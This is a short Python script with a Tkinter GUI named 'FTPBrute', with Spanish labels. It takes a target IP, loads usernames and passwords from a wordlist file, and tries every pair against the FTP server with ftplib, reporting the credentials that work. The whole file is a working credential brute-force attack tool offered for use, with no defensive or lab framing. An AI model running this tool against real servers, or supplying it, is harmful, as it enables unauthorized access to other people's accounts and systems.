import ftplib
from tkinter import *
from tkinter import messagebox as mbox

class App:
    def __init__(self, interfaz) -> None:
        self.gui = interfaz
        self.gui.title('FTPBrute')
        self.gui.resizable(0,0)
        self.gui.geometry('200x100')
        self.Ent()
        self.Lab()
        self.Bot()

    def Ent(self):
        self.ip = StringVar()
        Entry(self.gui, textvariable=self.ip, width=20, relief=SUNKEN).grid(row=1, column=0)

    def Lab(self):
        Label(self.gui, text='Introduce el IP:').grid(row=0, column=0)

    def Bot(self):
        Button(self.gui, text='Iniciar', command=self.main).grid(row=2,column=0)
        Button(self.gui, text='Salir', command=self.Salir).grid(row=2,column=1)

    def Salir(self):
        self.gui.quit()
        self.gui.destroy()

    def main(self):
        ip = self.ip.get()
        usuarios = open('ftp/users_password.txt','r')
        usuarios = usuarios.read().split('\n')
        passwords = open('ftp/users_password.txt','r')
        passwords = passwords.read().split('\n')

        def brute(ip, usuario,password):
            ftp = ftplib.FTP(ip)
            try:
                ftp.login(usuario, password)
                ftp.quit()
                mbox.showinfo('FTP','User: {}:{}'.format(usuario,password))
            except:
                mbox.showerror('ERROR',f'Fallo de la autenticacion para {usuario} y {password}')


        for usuario in usuarios:
            for p in passwords:
                brute(ip, usuario,p)


objeto = App(Tk())
objeto.gui.mainloop()
